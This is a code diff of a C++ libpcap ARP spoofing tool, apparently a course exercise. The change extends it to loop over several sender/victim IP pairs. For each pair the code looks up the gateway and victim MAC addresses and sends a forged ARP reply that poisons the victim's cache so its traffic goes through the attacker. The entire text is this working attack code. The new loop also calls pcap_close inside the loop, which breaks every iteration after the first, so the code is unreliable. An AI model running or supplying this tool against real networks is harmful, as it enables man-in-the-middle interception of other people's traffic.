@@ -68,12 +68,6 @@ const char* get_mac(pcap_t* pcap, EthArpPacket ep, char* target_ip){
     struct pcap_pkthdr* header;
     const u_char* p;
 
-//    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&ep), sizeof(EthArpPacket));
-//    if (res != 0) {
-//        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
-//    }
-//    else printf("res: %d", res);
-
     while(true){
         int res_ = pcap_next_ex(pcap, &header, &p);
         if (res_ != 1) continue;
@@ -124,15 +118,13 @@ void arp_packet(EthArpPacket p, const char* s_mac, const char* v_dmac, const cha
 
 int main(int argc, char* argv[]) {
     // printf("argc: %d\n", argc);
-    if (argc < 2) { // ----------------------------- the part which need to modify --------------------- //
+    if ((argc < 2) || (argc % 2 != 0)) { // ----------------------------- the part which need to modify --------------------- //
         usage();
         return -1;
     }
 
+    int times;
     char* dev = argv[1];
-    char* sender_ip = argv[2];
-    char* victim_ip = argv[3];
-    // printf("sender: %s, victim: %s\n", sender_ip, victim_ip);
 
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);  // need to modify
@@ -147,38 +139,46 @@ int main(int argc, char* argv[]) {
     char gw_ip[GW_IP_MAX_LEN];
     get_gw_ip(gw_ip);
 
+
     EthArpPacket packet;
 
-    arp_packet(packet, my_mac, init_eth_dmac, init_arp_tmac, ArpHdr::Request, sender_ip, gw_ip);
-    int res_gw = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-    if (res_gw != 0) {
-        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res_gw, pcap_geterr(handle));
+
+    for(times=1; times<(argc/2); times++){
+        char* sender_ip = argv[times*2];
+        char* victim_ip = argv[times*2+1];
+        printf("s_ip: %s, v_ip: %s\n", sender_ip, victim_ip);
+
+        arp_packet(packet, my_mac, init_eth_dmac, init_arp_tmac, ArpHdr::Request, sender_ip, gw_ip);
+        int res_gw = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+        if (res_gw != 0) {
+            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res_gw, pcap_geterr(handle));
+        }
+
+        const char* gw_mac = get_mac(handle, packet, gw_ip);
+        printf("gw mac: %s\n", gw_mac);
+
+
+        arp_packet(packet, my_mac, init_eth_dmac, init_arp_tmac, ArpHdr::Request, gw_ip, victim_ip);
+        int res_victim = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+        if (res_victim != 0) {
+            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res_victim, pcap_geterr(handle));
+        }
+
+        const char* victim_mac = get_mac(handle, packet, victim_ip);
+        printf("victim mac: %s\n", victim_mac);
+
+
+        arp_packet(packet, my_mac, victim_mac, victim_mac, ArpHdr::Reply, gw_ip, victim_ip);
+        int res_spoofing = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+        if (res_spoofing != 0) {
+            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res_spoofing, pcap_geterr(handle));
+        }
+
+        pcap_close(handle);
+
+        free((void*)gw_mac);
+        free((void*)victim_mac);
     }
-
-    const char* gw_mac = get_mac(handle, packet, gw_ip);
-    printf("gw mac: %s\n", gw_mac);
-
-
-    arp_packet(packet, my_mac, init_eth_dmac, init_arp_tmac, ArpHdr::Request, gw_ip, victim_ip);
-    int res_victim = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-    if (res_victim != 0) {
-        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res_victim, pcap_geterr(handle));
-    }
-
-    const char* victim_mac = get_mac(handle, packet, victim_ip);
-    printf("victim mac: %s\n", victim_mac);
-
-
-    arp_packet(packet, my_mac, victim_mac, victim_mac, ArpHdr::Reply, gw_ip, victim_ip);
-    int res_spoofing = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-    if (res_spoofing != 0) {
-        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res_spoofing, pcap_geterr(handle));
-    }
-
-
-    pcap_close(handle);
 
     free((void*)my_mac);
-    free((void*)gw_mac);
-    free((void*)victim_mac);
 }
